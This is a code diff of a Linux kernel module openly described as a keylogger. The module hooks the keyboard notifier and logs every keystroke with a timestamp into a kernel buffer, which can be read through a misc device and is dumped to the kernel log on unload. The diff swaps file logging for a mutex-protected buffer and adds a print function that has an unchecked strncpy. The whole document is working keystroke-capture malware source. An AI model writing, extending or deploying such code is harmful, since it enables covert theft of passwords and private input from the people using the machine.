@@ -6,6 +6,7 @@
 #include <linux/input.h>
 #include <linux/miscdevice.h>
 #include <linux/fs.h>
+#include <linux/slab.h>
 #include <linux/timekeeping.h>
 #include "keycode_to_us_string.c"
 
@@ -14,13 +15,10 @@ MODULE_AUTHOR("mademir");
 MODULE_DESCRIPTION("Keylogger");
 
 #define LOG_DEVICE "keylogger"
-#define LOG_FILE "/tmp/keylogger"
-// #define INITIAL_BUFFER_SIZE 4096
 
-static char		*device_buffer;
-static size_t	buffer_offset;
-static size_t	buffer_size;
-static struct file				*logfile;
+static char			*device_buffer;
+static size_t		buffer_offset;
+static DEFINE_MUTEX(buffer_lock);
 
 static int	log_func(struct notifier_block *nb, unsigned long action, void *data)
 {
@@ -32,8 +30,6 @@ static int	log_func(struct notifier_block *nb, unsigned long action, void *data)
     char log[128];
     size_t log_len;
 	int ascii_val;
-	// size_t bytes_written;
-
 
     ktime_get_real_ts64(&ts);
     ts.tv_sec += tz_offset;
@@ -46,8 +42,10 @@ static int	log_func(struct notifier_block *nb, unsigned long action, void *data)
 			log_len = snprintf(log, sizeof(log), "%02d:%02d:%02d | NAME: %s | ASCII: n/a | KEYCODE: %d | %s\n", tm.tm_hour, tm.tm_min, tm.tm_sec, buff, param->value, param->down ? "pressed" : "released");
 		else
 			log_len = snprintf(log, sizeof(log), "%02d:%02d:%02d | NAME: %s | ASCII: %d | KEYCODE: %d | %s\n", tm.tm_hour, tm.tm_min, tm.tm_sec, buff, ascii_val, param->value, param->down ? "pressed" : "released");
+
         printk(KERN_INFO "%s", log);
 
+		mutex_lock(&buffer_lock);
 		char *new_buffer = krealloc(device_buffer, buffer_offset + log_len + 1, GFP_KERNEL);
 		if (!new_buffer)
 		{
@@ -55,48 +53,46 @@ static int	log_func(struct notifier_block *nb, unsigned long action, void *data)
             return NOTIFY_OK;
 		}
 		device_buffer = new_buffer;
-		
-
-	    // // Ensure device_buffer is allocated
-        // if (!device_buffer) {
-        //     device_buffer = kmalloc(INITIAL_BUFFER_SIZE, GFP_KERNEL);
-        //     if (!device_buffer) {
-        //         printk(KERN_ERR "Keylogger: Failed to allocate memory for device buffer\n");
-        //         return NOTIFY_OK;
-        //     }
-        //     buffer_size = INITIAL_BUFFER_SIZE;
-        //     buffer_offset = 0;
-        // }
-
-        // // Check if buffer needs reallocation
-        // if (buffer_offset + log_len + 1 > buffer_size) {
-        //     char *new_buffer = krealloc(device_buffer, buffer_size + log_len + 1, GFP_KERNEL);
-		// 	printk(KERN_INFO "Keylogger: Reallocating memory !");
-        //     if (!new_buffer) {
-        //         printk(KERN_ERR "Keylogger: Failed to reallocate memory for device buffer\n");
-        //         return NOTIFY_OK;
-        //     }
-        //     device_buffer = new_buffer;
-        //     buffer_size += log_len + 1;
-        // }
-
 		memcpy(device_buffer + buffer_offset, log, log_len);
 		buffer_offset += log_len;
 		device_buffer[buffer_offset] = '\0';
-	
-		// if (logfile)
-		// {
-		// 	bytes_written = kernel_write(logfile, device_buffer, strlen(device_buffer), &logfile->f_pos);
-		// 	if (bytes_written < 0)
-		// 	{
-		// 		printk(KERN_ERR "Keylogger: failed to write to %s\n", LOG_FILE);
-		// 		filp_close(logfile, NULL);
-		// 		return bytes_written;
-		// 	}
-		// }
+		mutex_unlock(&buffer_lock);
 	}
-
     return NOTIFY_OK;
+}
+
+static void print_pressed_keys(void)
+{
+	char *pos = device_buffer;
+	char log[128];
+
+	printk(KERN_INFO "Keylogger: Final log\n");
+
+    while ((pos = strstr(pos, "pressed")) != NULL)
+    {
+        char *start = pos;
+        while (start != device_buffer && *start != '\n')
+        {
+            start--;
+        }
+        if (*start == '\n')
+        {
+            start++;
+        }
+		
+        char *end = pos;
+        while (*end != '\n' && *end != '\0')
+        {
+            end++;
+        }
+        size_t len = end - start;
+        strncpy(log, start, len);
+        log[len] = '\0';
+        printk(KERN_INFO "%s\n", log);
+        pos = end;
+    }
+
+	printk(KERN_INFO "Keylogger: End of final log\n");
 }
 
 static ssize_t	read_keylogger(struct file *file, char __user *buf, size_t count, loff_t *ppos)
@@ -120,15 +116,6 @@ static int	__init ModuleInit(void)
 
 	fops.owner = THIS_MODULE;
 	fops.read = read_keylogger;
-	// fops.write = my_write;
-	// fops.release = my_close;
-
-	logfile = filp_open(LOG_FILE, O_CREAT | O_WRONLY | O_TRUNC, 0644);
-	if (IS_ERR(logfile))
-	{
-        printk(KERN_ERR "Keylogger: Failed to open %s\n", LOG_FILE);
-        return PTR_ERR(logfile);
-    }
 
 	int misc_ret = misc_register(&misc_device);
 	if (misc_ret)
@@ -158,8 +145,9 @@ static void	__exit ModuleExit(void)
 {
 	printk(KERN_INFO "Keylogger: Exit module\n");
 
-	if (logfile)
-        filp_close(logfile, NULL);
+    mutex_lock(&buffer_lock);
+    print_pressed_keys();
+    mutex_unlock(&buffer_lock);
 
     misc_deregister(&misc_device);
 	unregister_keyboard_notifier(&keyboard_notifier);
